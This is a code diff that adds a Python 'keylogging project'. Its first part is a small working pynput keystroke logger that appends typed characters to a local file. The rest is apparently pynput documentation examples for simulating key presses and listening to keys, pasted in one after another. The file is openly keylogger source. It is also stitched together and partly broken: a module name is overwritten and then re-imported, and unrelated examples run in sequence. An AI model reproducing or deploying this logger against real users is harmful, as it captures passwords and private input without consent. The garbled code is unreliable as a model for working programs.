@@ -1,0 +1,85 @@
+#My Keylogging Project
+
+from pynput import keyboard
+
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+            try:
+                char = key.char
+                logKey.write(char)
+            except:
+                print("Error getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
+from pynput.keyboard import Key, Controller
+
+keyboard = Controller()
+
+# Press and release space
+keyboard.press(Key.space)
+keyboard.release(Key.space)
+
+# Type a lower case A; this will work even if no key on the
+# physical keyboard is labelled 'A'
+keyboard.press('a')
+keyboard.release('a')
+
+# Type two upper case As
+keyboard.press('A')
+keyboard.release('A')
+with keyboard.pressed(Key.shift):
+    keyboard.press('a')
+    keyboard.release('a')
+
+# Type 'Hello World' using the shortcut type method
+keyboard.type('Hello World')
+
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        print('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(
+            key))
+
+def on_release(key):
+    print('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+# ...or, in a non-blocking fashion:
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
+
+class MyException(Exception): pass
+
+def on_press(key):
+    if key == keyboard.Key.esc:
+        raise MyException(key)
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press) as listener:
+    try:
+        listener.join()
+    except MyException as e:
+        print('{0} was pressed'.format(e.args[0]))
+
